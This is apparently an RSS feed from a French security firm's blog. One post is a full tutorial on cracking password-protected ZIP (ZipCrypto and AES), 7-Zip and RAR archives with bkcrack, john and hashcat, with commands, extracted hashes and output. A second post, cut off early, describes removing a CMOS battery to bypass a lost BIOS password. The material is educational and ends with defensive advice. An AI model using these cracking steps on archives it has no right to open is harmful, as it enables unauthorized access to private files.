<p>Alors que la plupart des logiciels n&#8217;utilisent que les ZIP chiffrés en AES (ou utilisent la méthode de chiffrement AES par défaut), certains logiciels continuent cependant à générer des archives chiffrés en ZipCrypto par défaut. En cause le système d&#8217;exploitation Microsoft Windows qui ne permet pas de générer (sans installation d&#8217;un logiciel tiers) de Zip chiffré et ne sait déchiffrer que les archives Zip utilisant ZipCrypto, ce qui fait que cette méthode de chiffrement ancienne et dépréciée est toujours utilisée de nos jours.</p>
<p>Note : Cet article est aussi disponible <a href="https://www.acceis.fr/cracking-encrypt…ip-aes-7-zip-rar/" title="article: english version">en anglais</a> &#x1f1ec;&#x1f1e7;.</p>
<h2>Zip</h2>
<h3>ZipCrypto</h3>
<p>Les anciennes archives ZIP chiffrées sont sensibles à l&#8217;attaque à clair connu de Biham et Kocher (en anglais <em>Known-Plaintext Attack</em> ou KPA) si elles utilisent la méthode de chiffrement <strong>ZipCrypto Store</strong>. C&#8217;est également possible si l&#8217;archive utilise <strong>ZipCrypto Deflate</strong> mais reste plus difficile du fait que les fichiers sont <a href="https://math.ucr.edu/~mike/zipattacks.pdf">compressés</a> avant le chiffrement.</p>
<p>Pour vérifier quel algorithme de chiffrement est utilisé, vous pouvez utiliser 7z :</p>
<pre><code class="language-plaintext">$ 7z l -slt archive.zip | grep Method
Method = ZipCrypto Store

$ 7z l -slt archive.zip | grep Method
Method = ZipCrypto Deflate

$ 7z l -slt archive.zip | grep Method
Method = AES-256 Deflate</code></pre>
<p>Note : pour générer une archive ZIP en utilisant <strong>ZipCrypto Store</strong>, nous pouvons utiliser l&#8217;ancien utilitaire <a href="http://infozip.sourceforge.net/Zip.html">zip</a> : <code>zip -e -0 archive.zip logo_acceis.svg</code> ou <a href="https://www.7-zip.org/">7z</a> : <code>7z a -tzip -mx0 -p -mem=ZipCrypto archive.zip logo_acceis.svg</code>.</p>
<p>Pour réaliser cette attaque, il faut au moins 12 octets de texte en clair connu et au moins 8 d&#8217;entre eux doivent être contigus. Plus le texte connu contigu est grand, plus l&#8217;attaque est rapide.</p>
<p>Ce qui est bien, c&#8217;est que le format Zip ne peut pas protéger les noms de fichiers, donc même si l&#8217;archive est chiffrée, nous pouvons toujours lister les noms de fichiers, récupérer l&#8217;extension pour comprendre quel type de document est stocké et cibler la <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">signature du fichier</a> fixe (alias les <em>magic bytes</em>) si vous ne connaissez pas le contenu des fichiers chiffrés.</p>
<pre><code class="language-plaintext">$ 7z l archive.zip

7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64)

Scanning the drive for archives:
1 file, 1694 bytes (2 KiB)

Listing archive: archive.zip

--
Path = archive.zip
Type = zip
Physical Size = 1694

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-04-29 11:09:49 .....         3623         1498  logo_acceis.svg
------------------- ----- ------------ ------------  ------------------------
2022-04-29 11:09:49               3623         1498  1 files</code></pre>
<p>Dans cette archive, nous pouvons voir qu&#8217;il y a une image SVG. Nous savons que toute image SVG commencera par <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code> ou <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code> et sera peut-être suivie de <code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; ...</code>, mais ne gardons que ce qui est sûr à 100% : <code>&lt;?xml version=&quot;1.0&quot;</code> (19 octets de long), ce qui devrait être largement suffisant pour notre attaque.</p>
<p>Nous pouvons obtenir un octet supplémentaire gratuit du CRC. En effet, comme expliqué dans la <a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">spécification du format de fichier ZIP</a>, un en-tête de chiffrement de 12 octets est ajouté aux données de l&#8217;archive. Le dernier octet de l&#8217;en-tête de chiffrement est l&#8217;octet le plus significatif du CRC du fichier.</p>
<blockquote>
<p>6.1.3 Each encrypted file has an extra 12 bytes stored at the start<br />
of the data area defining the encryption header for that file.  The<br />
encryption header is originally set to random values, and then<br />
itself encrypted, using three, 32-bit keys.  The key values are<br />
initialized using the supplied encryption password.  After each byte<br />
is encrypted, the keys are then updated using pseudo-random number<br />
generation techniques in combination with the same CRC-32 algorithm<br />
used in PKZIP and described elsewhere in this document.</p>
<p>After the header is decrypted,  the last 1 or 2 bytes in Buffer<br />
SHOULD be the high-order word/byte of the CRC for the file being<br />
decrypted, stored in Intel low-byte/high-byte order.  Versions of<br />
PKZIP prior to 2.0 used a 2 byte CRC check; a 1 byte CRC check is<br />
used on versions after 2.0.  This can be used to test if the password<br />
supplied is correct or not.</p>
</blockquote>
<p>Nous pouvons obtenir le CRC du fichier en utilisant différents outils :</p>
<pre><code class="language-plaintext">$ 7z l -slt archive.zip  logo_acceis.svg | grep CRC
CRC = 1916B617
$ unzip -Z -v archive.zip logo_acceis.svg | grep CRC
  32-bit CRC value (hex):                         1916b617</code></pre>
<p>Donc l&#8217;octet juste avant le texte en clair (à l&#8217;offset -1) est 0x19.</p>
<p>Nous pouvons alors commencer l&#8217;attaque en utilisant <a href="https://github.com/kimci86/bkcrack">bkcrack</a> :</p>
<pre><code class="language-plaintext">$ printf &#039;&lt;?xml version=&quot;1.0&quot;&#039; &gt; plain.svg
$ bkcrack -C archive.zip -c logo_acceis.svg -p plain.svg -x -1 19</code></pre>
<ul>
<li><code>-C</code> : Archive zip contenant le fichier de chiffrement</li>
<li><code>-c</code> : Fichier contenant le texte chiffré (celui que nous ciblons dans l&#8217;archive)</li>
<li><code>-p</code> : Fichier contenant le texte en clair connu</li>
<li><code>-x</code> : Texte en clair supplémentaire en hexadécimal commençant à l&#8217;offset donné</li>
</ul>
<p>Cela prend beaucoup de temps (~24 min pour cet exemple) mais nous sommes capables de récupérer les clés de chiffrement.<br />
Bien qu&#8217;une attaque par liste de mots serait plus efficace pour des mots de passe faibles, l&#8217;avantage de cette méthode KPA est qu&#8217;elle peut aider à récupérer des fichiers protégés par des mots de passe beaucoup plus complexes.</p>
<pre><code class="language-plaintext">$ bkcrack -C archive.zip -c &#039;logo_acceis.svg&#039; -p plain.bin -x -1 19
bkcrack 1.3.5 - 2022-03-20
[15:07:25] Z reduction using 12 bytes of known plaintext
100.0 % (12 / 12)
[15:07:25] Attack on 573157 Z values at index 6
Keys: 18996980 070e64a5 38e61fb0
86.6 % (496251 / 573157)
[15:31:27] Keys
18996980 070e64a5 38e61fb0</code></pre>
<p>Ensuite, pour récupérer les fichiers originaux, nous avons plusieurs options.</p>
<p>Nous pouvons créer une copie de l&#8217;archive avec un mot de passe choisi.</p>
<pre><code class="language-plaintext">$ bkcrack -C archive.zip -k 18996980 070e64a5 38e61fb0 -U cracked.zip noraj
bkcrack 1.3.5 - 2022-03-20
[15:57:19] Writing unlocked archive cracked.zip with password &quot;noraj&quot;
100.0 % (1 / 1)
Wrote unlocked archive.</code></pre>
<p>Sinon, nous pouvons aussi essayer de craquer les clés pour trouver le mot de passe original.</p>
<p><code>bkcrack</code> peut effectuer un bruteforce sur les clés mais les options sont limitées et il ne supporte pas les attaques par liste de mots.</p>
<pre><code class="language-plaintext">$ bkcrack -k 18996980 070e64a5 38e61fb0 -r 8 \?a
bkcrack 1.3.5 - 2022-03-20
[16:16:01] Recovering password
length 0-6...
length 7...
length 8...
[16:16:01] Password
as bytes: 6d 6f 72 70 68 65 75 73
as text: morpheus</code></pre>
<p>En concaténant les trois clés, on obtient la clé principale PKZIP que l&#8217;on peut essayer de craquer avec Hashcat.</p>
<pre><code class="language-plaintext">$ haiti &#039;18996980070e64a538e61fb0&#039;
CRC-96 (ZIP)
PKZIP Master Key [HC: 20500]
PKZIP Master Key (6 byte optimization) [HC: 20510]
Crypt16

$ hashcat -m 20500 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<h3>AES</h3>
<p>Tout d&#8217;abord, nous devons extraire un hash craquable de l&#8217;archive Zip. Pour ce faire, nous pouvons utiliser le script <code>zip2john</code> fourni avec le paquet <code>john</code>.</p>
<pre><code class="language-plaintext">$ zip2john archive.zip
archive.zip/logo_acceis.svg:$zip2$*0*3*0*d56b93462995433968b5f3f76eccbaea*5d55*5aa*27b48e12e3164b4dedd49a676c53392544c2c73eb472aab93ab61ce8968c8bfe7780b5de771f5ec32172c99687cf38ec469c35ffb71b2b1b6d2679fcf173970b59e1b9207adf8c9190e394c3346ced7372e149dc91b84ca8b19321cadffa9f5b75514a2f58e9e840778aa70900507ec8dda645bb8c8e066edf98f8f87feb7a2d10aa084fdb39c696f3c92592ba81c543cc11e2dd969de477321abd7639435495e4f1b26f6badb31bd88792b96757936b47b26ed267685bd9240ee11777c42a10e6a5829e64b2dd1a4ae77d8bf80854450385f6e4fd98ac07ed8e0ed852a682133d81ef903b43d534e6f785172b9f078dad64351efdad6e0348983c0407fef4d87c0090989f158bdfbe97e30710869370c70d95aef04ce815cacf8405baa921e0441dd8d69d7e17aed4b8adbc9651732fc1d5d7a2c7ec99af45e25a4047805ee6a88649eda6e170a682c19b20c5bbfe4f5720f425d4afe71d1954c87b3b910213a3f059db5eedeb696d34773482e43f8067248054b520642648b002534acb732dd0bbec6fa4eeee508b25688b0fa70c64a09bb50dc9ead6aa8410f432b982c529b67161db42c00aeba567682856d610c8768c695b562522dd57456062e947b5fc0f4316b7a2a818274e166508e0211125bafc37cbe590de9b44925149a421d3b8c15b05aa82acbc41a6c20c933d6f0ad605506db122d588e1656c540c1c69d58c5f7532933f479f5db305c7d2575275a666c8ee3b7a37ec7f0fcf53fcbe0176df72e188667de4c503956dea8fcc6ec88c868fc3505c4aea03a46e4c395a673ad7981f943dd9457a847eac7fe6758fe98336ef33ce613ddaede21848be50b062984f42d53abb84b7bad59c8d8e39ab55415700a3a416249d8d35098e59a7152ce304e91c541a46418b986b31580820cd19796a739c485c2445b21c5736e1239198a9faf05fe642e26385f90dc082a74fe560fb269bf90529af46b6986cf1ada22e95cf3dc276dd46fdbd501da78991f251556773543e8e6519c4ed4db2d954dd7e9b82e7694f17be9c75a3d5813347f0f5f7bdc8086a06bbc7510bc30b81e9fb31aec599ce018558e06214b42063386ddde083efe25889f262d25640cba5c2c3088d3cfd08263a89922ab6cf7fb3e5887acb20c851e130391a0034029a4400f4b9118f1fa740868da097b7c4529c55dc02c568c6dee5304ffd461e945c2be22d6d2fe5efe94937834035851d584bf7da08d9db49916bb055fb12983e1bce1be997f9e9b3e2f0650eccb250592f3720ba8ed1ee210b795c022b01326047d5fe23ee10058b43950fdd7520dda0cf3ec5c026d767c5cb40599a24da7c49fb4609b69900ad922680e1f3da25afd0d8581c6ff0dad8897a72f4e9a0540b1ba7d8a4d316714adb0543ef3377feeab47e2b6739db092cbe254afb9f9fbe485b971aca0a4fea5f669bf6f71492508e6bc1ace46aec90533e4fdf3c93fc6a1e0897cfcc965f7457d53045ec2a2d5da2b04249894cf920c91f20a03128adbf7d2a4072b287481d4c7714ad8785fae5713666d1308ea90f07d99951a36f687be95d35f7ec1322f7b92e3a0d6615485461cad911472faae76a6b548fa5226c1cca1187245c3ca7978fb19ccb5911d34a158888d3b6a758def7546a21cc0f4120687edc25f798a0583b768f99d5021d35bfefc4f22e0e909e720dc02f9a2350dc8f41c2e092726dcca4cdc45eb0e0d969312d4ee7a79b6856fb8792868ed3e4b97aecb62c61779658b9b55c5fe4606c086bdf88d88dc24a5ff822ae035093a104839acf0566367e13d4b658249db0d947f37e26dbe67d6fe92313d4c5546576000891e3e46c749848d5dd3cb9110709f75f35fd826650a2787a300303583cbeb06f88fe0209482b403fd8fe0cbc88159d420acb0c2f680e96a43087c170a9f07b93748b36359f5a522d0f2354f4d540e0fc45e9f7de99aced9d9ee0ba64dc9b61bc4d9111f439c6d9d79f50b1e3143e259a5a09094dd4a8d946b24564919e5350ed83562df37e2419620c29b0d72f7639d6*d4a4e58a92cbb2a72f38*$/zip2$:logo_acceis.svg:archive.zip:archive.zip
$ rar2john archive.rar &gt; hash.txt</code></pre>
<p>Nous pouvons utiliser <a href="https://github.com/noraj/haiti">haiti</a> pour déterminer le type de hash (que nous connaissons déjà) et la référence correspondante pour Hashcat (HC) et John the Ripper (JtR) :</p>
<pre><code class="language-plaintext">$ haiti $(cut -d &#039;:&#039; -f 2 hash.txt)
WinZip [HC: 13600] [JtR: zip]</code></pre>
<p>Maintenant, nous pouvons essayer une attaque bruteforce de liste de mots sur le hash avec JtR.</p>
<pre><code class="language-bash"># ~56k essais par seconde sur ma machine (Intel i5-1145G7 @ 2.6 GHz), crack instantané pour le mot de passe morpheus
john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=zip</code></pre>
<p>Si nous voulons essayer avec HC, nous devons retirer le nom du fichier du hash :</p>
<pre><code class="language-plaintext">$ cut -d &#039;:&#039; -f 2 hash.txt &gt; hash-hc.txt</code></pre>
<p>Le craquage avec Hashcat a 3 fois plus d&#8217;essais par seconde mais prend étrangement plus de temps :</p>
<pre><code class="language-plaintext"># ~163k essais par seconde sur ma machine (Intel TigerLake-LP GT2 [Iris Xe Graphics]), crack de 20 sec pour le mot de passe morpheus
hashcat -m 13600 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<p>Note : cette méthode peut également fonctionner pour les archives protégées par ZipCrypto. Comme indiqué précédemment, les attaques par liste de mots ou par force brute sont plus efficaces pour les mots de passe faibles, mais l&#8217;attaque à clair connu de Biham et Kocher pourrait être la seule option pour les mots de passe complexes.</p>
<h2>7-zip</h2>
<p>Tout d&#8217;abord, nous devons extraire un hash craquable de l&#8217;archive 7z. Pour ce faire, nous pouvons utiliser le script <code>7z2john</code> fourni avec le paquet <code>john</code> mais il nécessite le module Perl <code>Compress::Raw::Lzma</code> pour fonctionner. Nous pouvons l&#8217;installer avec <a href="https://www.cpan.org/">CPAN</a> : <code>cpan install Compress::Raw::Lzma</code>.</p>
<p>Maintenant nous pouvons obtenir le hash :</p>
<pre><code class="language-plaintext">$ 7z2john archive.7z
archive.7z:$7z$0$19$0$$16$fece1a2adfc036675b63b8d17fd3f23f$1908987488$128$122$525a8b050266d616bc88c39ef6184bfe642ed3b2efa7a97c1661fe46ffab4fada7501a39702397a38fae8b61289a22a3cdefd85812e637da96e723ded8b41f6def71aab1c5722413eaafba07fc6945cfe495650ef9f36ef5cb98f6f060994359717a3e4e5e3c1ee31139c0ab51140a79804064ad7fa870c5a1d0b97d98ce6934
$ 7z2john archive.7z &gt; hash.txt</code></pre>
<p>Note : l&#8217;archive 7z de test a été générée avec une compression LZMA2, un chiffrement AES256 et sans multi-volume.</p>
<p>Nous pouvons utiliser <a href="https://github.com/noraj/haiti">haiti</a> pour déterminer le type de has (que nous connaissons déjà) et la référence correspondante pour Hashcat (HC) et John the Ripper (JtR) :</p>
<pre><code class="language-plaintext">$ haiti $(cut -d &#039;:&#039; -f 2 hash.txt)
7-zip [HC: 11600] [JtR: 7z]</code></pre>
<p>Maintenant nous pouvons essayer une attaque par force brute de liste de mots sur le hash avec JtR, c&#8217;est lent.</p>
<pre><code class="language-bash"># 43 essais par seconde sur ma machine (Intel i5-1145G7 @ 2.6 GHz), 5 min de crack pour le mot de passe morpheus
john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=7z</code></pre>
<p>Si nous voulons essayer avec HC, nous devons retirer le nom du fichier du hash :</p>
<pre><code class="language-plaintext">$ cut -d &#039;:&#039; -f 2 hash.txt &gt; hash-hc.txt</code></pre>
<p>Le craquage avec Hashcat a 3 fois plus d&#8217;essais par seconde mais est étrangement 2 fois plus long :</p>
<pre><code class="language-bash"># 130 essais par seconde sur ma machine (Intel TigerLake-LP GT2 [Iris Xe Graphics]), 10 mins, 44 secs de craquage pour le mot de passe morpheus
hashcat -m 11600 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<p>Remarque : les archives chiffrées 7z protègent également les noms de fichiers.</p>
<h2>RAR</h2>
<p>Tout d&#8217;abord, nous devons extraire un hash craquable de l&#8217;archive RAR. Pour ce faire, nous pouvons utiliser le script <code>rar2john</code> fourni avec le paquet <code>john</code>.</p>
<pre><code class="language-plaintext">$ rar2john archive.rar
archive.rar:$rar5$16$0ee908df02e8f7e7697d862388d329eb$15$52eafa34fd7337161521ca986dcc9e8b$8$a887866220451ac5
$ rar2john archive.rar &gt; hash.txt</code></pre>
<p>Remarque : l&#8217;archive de test a été générée au format RAR 5.0 qui <a href="https://www.win-rar.com/encryption-faq.html?&amp;L=0#which-encryption-technology-uses-winrar">semble utiliser AES-256</a>.</p>
<p>Nous pouvons utiliser <a href="https://github.com/noraj/haiti">haiti</a> pour déterminer le type de hash (que nous connaissons déjà) et la référence correspondante pour Hashcat (HC) et John the Ripper (JtR) :</p>
<pre><code class="language-plaintext">$ haiti $(cut -d &#039;:&#039; -f 2 hash.txt)
SAP CODVN B (BCODE) [HC: 7700] [JtR: sapb]
RAR5 [HC: 13000] [JtR: rar5]</code></pre>
<p>Maintenant, nous pouvons essayer une attaque par force brute de liste de mots sur le hachage avec JtR.</p>
<pre><code class="language-bash"># ~350 essais par seconde sur ma machine (Intel i5-1145G7 @ 2.6 GHz), crack de 35 sec pour le mot de passe morpheus
john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=rar5</code></pre>
<p>Si nous voulons essayer avec HC, nous devons retirer le nom du fichier du hash :</p>
<pre><code class="language-plaintext">$ cut -d &#039;:&#039; -f 2 hash.txt &gt; hash-hc.txt</code></pre>
<pre><code class="language-bash"># ~2000 essais par seconde sur ma machine (Intel TigerLake-LP GT2 [Iris Xe Graphics]), 40 secs de crack pour le mot de passe morpheus
hashcat -m 13000 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<p>Note : la même méthode fonctionne pour les archives RAR3, seules les références HC et JtR seront différentes.</p>
<h2>Conclusion</h2>
<p>Peu importe le format d’archive, il est recommandé de vérifier la méthode de chiffrement utilisée et de choisir la plus robuste proposée dans les options du logiciel pour générer une archive chiffrée.</p>
<p>Pour le format ZIP en particulier, il est recommandé d&#8217;utiliser AES comme méthode de chiffrement. En effet, même avec un mot de passe fort, ZipCrypto est vulnérable par conception, il y a donc de grande chances qu&#8217;il soit possible de lire les documents que l&#8217;archive enferme sans en connaître le mot de passe.</p>
<p>Enfin, même si une méthode de chiffrement robuste est utilisée, l&#8217;utilisation d&#8217;un mot de pas faible peut compromettre la sécurité de l&#8217;archive. Il est donc recommandé d&#8217;utiliser <a href="https://www.ssi.gouv.fr/administration/precautions-elementaires/calculer-la-force-dun-mot-de-passe/">un mot de passe fort</a> pour protéger l&#8217;archive.</p>
<p>Exemple du choix de la méthode de chiffrement dans 7-zip :</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/7-zip.png" alt="7-zip" /></p>
<p>Exemple du choix de la méthode de chiffrement dans Ark :</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/ark.png" alt="ark" /></p>
<p>Exemple du choix de la méthode de chiffrement dans WinRAR (Cocher la case &quot;Chiffrement ZIP&quot; en français ou &quot;ZIP legacy encryption&quot; en anglais utilisera ZipCrypto, WinRAR utilisera AES si elle n&#8217;est pas cochée) :</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/WinRAR.png" alt="winrar" /></p>
<h2>A propos de l&#8217;auteur</h2>
<p>Article écrit par Alexandre ZANNI alias <a href="https://pwn.by/noraj/">noraj</a>, Ingénieur en Test d&#8217;Intrusion chez <a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">Craquage d&#8217;archives chiffrées (PKZIP: Zip ZipCrypto, Winzip: Zip AES, 7 Zip, RAR)</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Bypass d’un mot de passe bios perdu via dump et injection d’un UEFI</title>
		<link>https://www.acceis.fr/bypass-dun-mot-de-passe-bios-perdu-via-dump-et-injection-dun-uefi/</link>
		
		<dc:creator><![CDATA[Rémi Assidi]]></dc:creator>
		<pubDate>Mon, 04 Jul 2022 05:03:50 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=2227</guid>

					<description><![CDATA[<p>Apprenez comment bypass l'authentification d'un bios en dumpant puis en réinjectant l'UEFI dans l'EEPROM de votre carte mère.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/bypass-dun-mot-de-passe-bios-perdu-via-dump-et-injection-dun-uefi/">Bypass d’un mot de passe bios perdu via dump et injection d’un UEFI</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[
<h2><span class="has-inline-color has-secondary-color">1) Refourguez le projet impossible à un alternant</span></h2>



<p>Lors d’une magnifique journée de R&amp;D, je travaillais à mon habitude sur l’analyse et la recherche de vulnérabilités dans des produits IKEA (mais chut, c’est secret).</p>



<p>Alors que l’excitation arrivait à son paroxysme, j’entendis au loin la douce voix de PIX me criant “<em>Rémi, j’ai un truc pour toi</em>”. C’est tout naturellement que j’ai tenté de fuir sentant le projet douteux arriver. Malheureusement je n’ai pas trouvé d’endroit où me cacher.</p>



<p>Avec la grâce d’un cygne, celui-ci arrive à mon bureau et m’expose le problème.</p>



<p>PIX ⇒ “<em>Un auditeur a laissé son ancien ordinateur avec le mot de passe BIOS et nous ne pouvons pas le déverrouiller.</em>”</p>



<p>Rémi ⇒ “<em>Mais c’est un boulot pour notre admin-sys préféré Damien</em>”</p>



<p>PIX ⇒ “<em>Malheureusement il a déjà es</em>sayé <em>les techniques communes</em> <em>mais il n’a</em> <em>pas</em> <em>réussi à le déverrouiller</em>”</p>



<p>Rémi ⇒ “<em>Mais &#8230;</em>”</p>



<p><em>PIX</em> <em>lâche l’ordinateur et part en courant</em>.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="768" height="1024" src="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659-768x1024.jpg" alt="" class="wp-image-2270" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659-768x1024.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659-225x300.jpg 225w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659-1152x1536.jpg 1152w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659-45x60.jpg 45w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659-75x100.jpg 75w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659-150x200.jpg 150w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_171659.jpg 1500w" sizes="(max-width: 768px) 100vw, 768px" /></figure></div>



<h2><span class="has-inline-color has-secondary-color">2) Commencez les investigations</span></h2>



<p>Comme je ne doute absolument pas des compétences de mes camarades, j’ai décidé de réessayer les techniques de base afin de bypass le mot de passe du BIOS.</p>



<h3><span class="has-inline-color has-primary-color">A) Documentez-vous</span></h3>



<p>Ce magnifique ordinateur est un <strong>HP OMEN 15-ax225nf</strong>. C’est tout naturellement que nous nous dirigeons vers le site officiel du constructeur afin de trouver :</p>



<ul><li>Un manuel utilisateur relativement vide.</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="900" height="793" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled.png" alt="" class="wp-image-2271" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled.png 900w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-300x264.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-768x677.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-60x53.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-100x88.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-200x176.png 200w" sizes="(max-width: 900px) 100vw, 900px" /></figure></div>



<ul><li>Une page nous indiquant qu&#8217;aucun pilote n&#8217;est disponible.</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="922" height="269" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-2.jpg" alt="" class="wp-image-2272" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-2.jpg 922w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-300x88.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-768x224.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-60x18.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-100x29.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-200x58.jpg 200w" sizes="(max-width: 922px) 100vw, 922px" /></figure></div>



<ul><li>Un tutoriel de mise à jour du BIOS assez windowsien.</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="936" height="651" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled3.png" alt="" class="wp-image-2273" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled3.png 936w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled3-300x209.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled3-768x534.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled3-60x42.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled3-100x70.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled3-200x139.png 200w" sizes="(max-width: 936px) 100vw, 936px" /></figure></div>



<p>En même temps, pourquoi espérer trouver un schéma de carte mère sur le site officiel du vendeur ou encore un tutoriel expliquant comment supprimer le mot de passe BIOS.</p>



<p>En surfant sur le net, je tombe sur un magnifique site proposant de supprimer le mot de passe en échange d’argent.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="893" height="136" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled4.png" alt="" class="wp-image-2274" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled4.png 893w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled4-300x46.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled4-768x117.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled4-60x9.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled4-100x15.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled4-200x30.png 200w" sizes="(max-width: 893px) 100vw, 893px" /></figure></div>



<p>Je n’ai aucun doute concernant l’honnêteté de ce vendeur espagnol, mais la facture risque d’être compliquée à faire passer dans les frais d’entreprise.</p>



<p>Malheureusement l’internet est relativement pauvre en documentation concernant notre ordinateur. Il va donc falloir travailler méthodiquement en suivant la méthode appelée dans le milieu “le feeling”.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="603" height="452" src="https://www.acceis.fr/voy_content/uploads/2022/05/y877u.jpg" alt="" class="wp-image-2268" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/y877u.jpg 603w, https://www.acceis.fr/voy_content/uploads/2022/05/y877u-300x225.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/y877u-60x45.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/y877u-100x75.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/y877u-200x150.jpg 200w" sizes="(max-width: 603px) 100vw, 603px" /></figure></div>



<h3><span class="has-inline-color has-primary-color">B) Retirez la PILE CMOS</span></h3>



<p>Première piste, la pile CMOS.</p>



<p>Les ordinateurs modernes contiennent une petite mémoire CMOS (<em>Complementary Metal-Oxide-Semiconductor</em>). Cette mémoire nécessite une faible quantité d’électricité afin de maintenir les données. Cette alimentation est notamment assurée par la pile CMOS.</p>



<p>La logique est donc la suivante : si nous retirons la pile CMOS et coupons l’alimentation, toutes les données de configuration et tous les mots de passe seront réinitialisés.</p>



<p>Nous nous attaquons donc au démontage de l’ordinateur afin de retirer cette fameuse pile.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="647" height="869" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled5.jpg" alt="" class="wp-image-2275" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled5.jpg 647w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled5-223x300.jpg 223w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled5-45x60.jpg 45w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled5-74x100.jpg 74w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled5-149x200.jpg 149w" sizes="(max-width: 647px) 100vw, 647px" /></figure></div>



<p>Au passage, on fait attention à ne pas percer la batterie qui est sur le point d&#8217;exploser.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="637" height="850" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled6.jpg" alt="" class="wp-image-2276" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled6.jpg 637w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled6-225x300.jpg 225w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled6-45x60.jpg 45w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled6-75x100.jpg 75w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled6-150x200.jpg 150w" sizes="(max-width: 637px) 100vw, 637px" /></figure></div>



<p>Après moult péripéties et une batterie en moins, nous pouvons enfin retirer la pile et aller boire un café.</p>



